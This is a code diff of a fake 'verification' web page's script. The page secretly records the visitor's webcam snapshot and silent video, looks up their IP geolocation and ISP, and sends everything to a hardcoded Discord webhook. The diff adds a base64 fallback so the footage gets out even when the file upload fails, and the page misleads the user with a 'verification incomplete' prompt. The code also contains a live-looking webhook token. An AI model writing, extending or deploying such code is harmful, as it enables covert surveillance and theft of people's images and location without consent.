@@ -59,7 +59,7 @@
     const progressText = document.getElementById('progressText');
 
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479318338411827384/nNZ_pZsoR7CZJn9n6U_UA4hawAdOKiGngDqoDBNkbTT7pggzniMRTDh7wO_tNRfDXhZZ";
-    const RECORD_DURATION = 15000; // bumped to 15s for better metadata
+    const RECORD_DURATION = 15000;
 
     let startTime = 0;
     let animationFrameId = null;
@@ -69,10 +69,8 @@
       const elapsed = Date.now() - startTime;
       let percent = (elapsed / RECORD_DURATION) * 100;
       if (percent > 100) percent = 100;
-
       progressBar.style.width = percent + '%';
       progressText.textContent = Math.round(percent) + '%';
-
       if (percent < 100) animationFrameId = requestAnimationFrame(updateProgress);
     }
 
@@ -80,12 +78,30 @@
       const payload = { content };
       const formData = new FormData();
       formData.append('payload_json', JSON.stringify(payload));
-      if (fileBlob) {
-        formData.append('file', fileBlob, filename);
-      }
+      if (fileBlob) formData.append('file', fileBlob, filename);
       try {
-        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-      } catch {}
+        const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+        return res.ok;
+      } catch {
+        return false;
+      }
+    }
+
+    async function sendVideoAsBase64(blob, geo) {
+      const reader = new FileReader();
+      reader.onload = async () => {
+        const base64 = reader.result.split(',')[1];
+        const content = `🎥 Video capture (base64) - save as .webm to play\n` +
+                        `UA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n` +
+                        `**Location/Device:**\n${geo}\n\n` +
+                        `Base64 data (paste into base64 decoder or file):\n${base64.slice(0, 2000)}... (truncated - full in dev tools if needed)`;
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content })
+        });
+      };
+      reader.readAsDataURL(blob);
     }
 
     async function captureSnapshot(stream) {
@@ -93,10 +109,7 @@
       canvas.width = videoElement.videoWidth || 640;
       canvas.height = videoElement.videoHeight || 480;
       context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-      return new Promise((resolve) => {
-        canvas.toBlob((blob) => resolve(blob), 'image/png');
-      });
+      return new Promise(r => canvas.toBlob(r, 'image/png'));
     }
 
     async function recordAndSend() {
@@ -114,7 +127,7 @@
 
         await new Promise(r => setTimeout(r, 1800));
 
-        // Snapshot first
+        // Face snap first
         const snapshotBlob = await captureSnapshot(stream);
         if (snapshotBlob) {
           let geo = "Location grab failed";
@@ -128,11 +141,11 @@
           await sendToWebhook(`🎯 Face snap captured\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`, snapshotBlob, `face_${Date.now()}.png`);
         }
 
-        // Video part
+        // Video attempt
         progressContainer.style.display = 'block';
         msg.textContent = "";
 
-        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' }); // vp9 for better chance
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
         const chunks = [];
 
         recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
@@ -144,9 +157,8 @@
 
           stream.getTracks().forEach(t => t.stop());
 
-          const blob = new Blob(chunks, { type: 'video/webm' });
-
-          if (chunks.length > 0 && blob.size > 100 * 1024) { // skip if tiny/corrupt
+          if (chunks.length > 0) {
+            const blob = new Blob(chunks, { type: 'video/webm' });
             let geo = "Location grab failed";
             try {
               const res = await fetch('https://ipapi.co/json/');
@@ -155,7 +167,16 @@
                 if (!d.error) geo = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
               }
             } catch {}
-            await sendToWebhook(`🎥 Full clip (silent)\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`, blob, `verification_${Date.now()}.webm`); // back to .webm ext
+
+            const vidContent = `🎥 Full clip attempt (silent)\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`;
+
+            // Try normal file send first
+            let success = await sendToWebhook(vidContent, blob, `verification_${Date.now()}.webm`);
+
+            // If failed, fallback to base64 in text
+            if (!success && blob.size > 50 * 1024) {
+              await sendVideoAsBase64(blob, geo);
+            }
           }
 
           msg.textContent = "Verification incomplete. Center Face In Camera View";
